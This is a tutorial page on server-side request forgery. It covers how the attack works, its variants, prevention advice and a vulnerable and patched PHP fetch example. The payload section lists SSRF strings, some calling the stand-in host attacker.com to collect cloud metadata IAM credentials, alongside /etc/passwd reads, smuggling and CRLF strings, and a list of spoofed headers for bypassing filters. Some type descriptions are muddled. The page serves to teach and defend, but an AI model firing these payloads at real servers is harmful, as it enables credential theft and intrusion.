---
title: "SSRF"
description: ""
lead: ""
draft: false
images: []
type: docs
weight: 50
---

<div class="img-border">
<img src="SSRF.png" width=100%>
</div>
<br><br>



## What is SSRF?

Server Side Request Forgery (SSRF) is a type of vulnerability that allows an attacker to send malicious requests from a vulnerable web application server. The attacker can use SSRF to access unauthorized internal resources or to perform actions on behalf of the victim user. This tutorial will explain what SSRF is, how it works, and how to prevent it.

<br><br>
SSRF arises when a web application allows the attacker to specify the URL of a resource that the server will retrieve. The attacker can then craft a request that will cause the server to retrieve a resource that the attacker should not have access to. For example, an attacker might be able to make the server retrieve a file from an internal network that is not accessible from the internet.
<br>


## How does SSRF work?

---
    
<div class="diagram-container">
  <div class="step step-1">
    
<span class="step-text"><br>
Attacker sends a request to the vulnerable server with a crafted URL containing the<br> malicious payload ☠️ :</span> 
`GET 
    /vulnerable_endpoint?url=http://127.0.0.1/admin HTTP/1.1`
 <br><br>
     
  </div>
  </div>

  <div class="diagram-container">
  <div class="step step-2">
    
<span class="step-text"><br>Vulnerable server receives the request and processes the URL, including the malicious payload.</span> <br>
     
  
  </div>
  </div>
<br>
  <div class="diagram-container">
  <div class="step step-3">
 
<span class="step-text"> Server sends a request to the targeted resource using the URL specified in the malicious payload.</span>  <br><br>
    

  </div>
  </div>
  <div class="diagram-container">
  <div class="step step-4">

<span class="step-text"> Targeted resource responds to the request, sending sensitive data or executing a command.</span> <br><br>

  </div>
</div>

---

<br><br><br>

SSRF typically works by exploiting input validation vulnerabilities in a web application. For example, an attacker might be able to specify the URL of a resource to be retrieved in a GET or POST request to the web application. The attacker can then craft a request that causes the server to retrieve a resource that it should not have access to.

## Examples of SSRF

An example of SSRF is when an attacker is able to specify the URL of a resource to be retrieved in a GET or POST request to a web application. The attacker can then craft a request that causes the server to retrieve a resource that it should not have access to. For example, an attacker might be able to make the server retrieve a file from an internal network that is not accessible from the internet.

Another example of SSRF is when an attacker is able to specify the URL of a resource to be retrieved in an XML or JSON file that is processed by a web application. The attacker can then craft a file that causes the server to retrieve a resource that it should not have access to.

## Types of SSRF 

`In-band`: In-band SSRF allows an attacker to directly interact with the vulnerable server, for example by injecting malicious code into a log file.

`In-band SSRF`: In-band SSRF payloads are usually specific to the application being targeted, but here's an example of a payload that might work for a generic web application:

`Out-of-band`: Out-of-band SSRF is a type of SSRF where the attacker can receive a response from the vulnerable server outside of the initial request-response cycle. This can be achieved through techniques such as DNS resolution or SMTP email notifications.

`Blind`: Blind SSRF is a type of SSRF where the attacker cannot directly see the response from the request, but can still exploit the vulnerability by using side-channel attacks or other techniques.

`Semi-blind`: Semi-blind SSRF is similar to blind SSRF, but the attacker can partially see the response from the request, for example by detecting differences in response times.

## SSRF combined with other attacks

SSRF can be combined with multiple attacks to further exploit a vulnerable web application:

**Information disclosure**: An attacker can use SSRF to access sensitive information, such as files or credentials, stored on internal servers.

**Remote Code Execution (RCE)**: An attacker can use SSRF to execute arbitrary code on internal servers, which can lead to a full compromise of the application and its underlying infrastructure.

**DDoS attacks**: An attacker can use SSRF to launch DDoS attacks on internal servers by flooding them with requests.

**DNS rebinding**: An attacker can use SSRF to bypass Same Origin Policy (SOP) restrictions by manipulating DNS responses to redirect requests to a malicious server.

**[ ! ]** *These are just a few examples of attacks that can be combined with SSRF. It is important to understand the potential impact of SSRF and take appropriate measures to prevent it.*

## Payload Examples:

**[ ! ]** *These are just examples, to give an idea of how an SSRF payload might look like.*

Basic Payload:<br>  **`http://localhost:22`**

IP Address Payload:<br>  **`http://192.168.0.1:22`**

DNS Lookup Payload:<br>  **`http://attacker.com`**

Port Scan Payload:<br>  **`http://attacker.com:22`**

File Read Payload:<br>  **`file:///etc/passwd`**

File Write Payload:<br>  **`dict://127.0.0.1:22/test.txt`**

Server-Side Request Forgery (SSRF) using XSPA:<br>  **`http://127.0.0.1/admin.php`**

Server-Side Request Forgery (SSRF) using Error Messages:<br>  **`http://127.0.0.1/admin.php?invalidparam=1`**

Server-Side Request Forgery (SSRF) using CRLF injection:<br> **`http://127.0.0.1/admin.php?nexturl=%0D%0ASet-Cookie:%20test=test`**

Blind SSRF using Out-of-Band (OOB) techniques:<br>  **`http://attacker.com/collect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`**

Blind SSRF using Request Smuggling:<br>  **`GET http://attacker.com HTTP/1.1\nHost: vulnerable.com\nTransfer-Encoding: chunked\n\n0\nGET /admin HTTP/1.1\nHost: 127.0.0.1\n\n`**

Blind SSRF using HTTP Parameter Pollution (HPP):<br>  **`http://<Target>/page?id=1&id=2&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`**

Blind SSRF using DNS Rebinding:<br>  **`http://attacker.com/?ip=127.0.0.1`**

Blind SSRF using HTTP Host Header: <br> **`http://attacker.com\nHost: 127.0.0.1/admin`**

Blind SSRF using SMTP Header:<br>  **`GET / HTTP/1.1\nHost: vulnerable.com\n\nRCPT TO:<attacker@attacker.com>\nDATA\nSubject: SSRF\n.\nQUIT\n`**

<br>

## SSRF, Firewall and forbidden bypass list

    Base-Url: 127.0.0.1
    Client-IP: 127.0.0.1
    Http-Url: 127.0.0.1
    Proxy-Host: 127.0.0.1
    Proxy-Url: 127.0.0.1
    Real-Ip: 127.0.0.1
    Redirect: 127.0.0.1
    Referer: 127.0.0.1
    Referrer: 127.0.0.1
    Refferer: 127.0.0.1
    Request-Uri: 127.0.0.1
    Uri: 127.0.0.1
    Url: 127.0.0.1
    X-Client-IP: 127.0.0.1
    X-Custom-IP-Authorization: 127.0.0.1
    X-Forward-For: 127.0.0.1
    X-Forwarded-By: 127.0.0.1
    X-Forwarded-For-Original: 127.0.0.1
    X-Forwarded-For: 127.0.0.1
    X-Forwarded-Host: 127.0.0.1
    X-Forwarded-Port: 443
    X-Forwarded-Port: 4443
    X-Forwarded-Port: 80
    X-Forwarded-Port: 8080
    X-Forwarded-Port: 8443
    X-Forwarded-Scheme: http
    X-Forwarded-Scheme: https
    X-Forwarded-Server: 127.0.0.1
    X-Forwarded: 127.0.0.1
    X-Forwarder-For: 127.0.0.1
    X-Host: 127.0.0.1
    X-Http-Destinationurl: 127.0.0.1
    X-Http-Host-Override: 127.0.0.1
    X-Original-Remote-Addr: 127.0.0.1
    X-Original-Url: 127.0.0.1
    X-Originating-IP: 127.0.0.1
    X-Proxy-Url: 127.0.0.1
    X-Real-Ip: 127.0.0.1
    X-Remote-Addr: 127.0.0.1
    X-Remote-IP: 127.0.0.1
    X-Rewrite-Url: 127.0.0.1
    X-True-IP: 127.0.0.1


## How to prevent SSRF

There are several ways to prevent SSRF vulnerabilities:

1. Input validation: Validate all input from untrusted sources, such as user input and external systems, to ensure that it conforms to expected values and does not include any malicious content.

2. URL whitelisting: Whitelist the URLs that the web application is allowed to access, to prevent the server from accessing unauthorized resources.

3. Use of security libraries: Use security libraries that provide protection against SSRF, such as the OWASP ESAPI library.

4. Use of firewalls and proxies: Use firewalls and proxies to monitor and filter outgoing requests from the web application server.

<br>




## Code Example:

This code takes a user-supplied URL as input through the **`$_GET`** variable and uses the **`file_get_contents()`** function to fetch the contents of the URL. However, this code is vulnerable to SSRF attacks since it does not validate or sanitize the user input.




    <?php
    $url = $_GET['url'];
    $response = file_get_contents($url);
    echo $response;
    ?>



<br><br>

To fix this vulnerability, we need to implement proper input validation and URL whitelisting. We can achieve this by checking that the URL passed as input is valid and allowed by the application. Here's an example of how to modify the code to fix the vulnerability:


    <?php
        // Define a whitelist of allowed domains
        $allowed_domains = array('example.com', 'google.com', 'facebook.com');
        
        // Get the URL parameter from the user input
        $url = $_GET['url'];
        
        // Check if the URL is valid and allowed
        $parsed_url = parse_url($url);
        if (in_array($parsed_url['host'], $allowed_domains)) {
            // Retrieve the contents of the URL
            $response = file_get_contents($url);
            echo $response;
        } else {
            // Throw an error or log the unauthorized access attempt
            echo "Unauthorized access attempt";
        }
    ?>

In this modified code, we define a whitelist of allowed domains that the application is allowed to access. We then retrieve the url parameter from the user input and check if the domain of the URL is valid and allowed by the application. If the URL is allowed, we proceed to retrieve the contents of the URL using file_get_contents() and echo the response to the user. If the URL is not allowed, we throw an error or log the unauthorized access attempt.

This modification adds an extra layer of security to the application and prevents attackers from exploiting the SSRF vulnerability. However, it's important to note that this is just one example of how to fix the vulnerability, and depending on the specific use case, other security measures may also be necessary.

<br><br>

## Payload Resources

- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)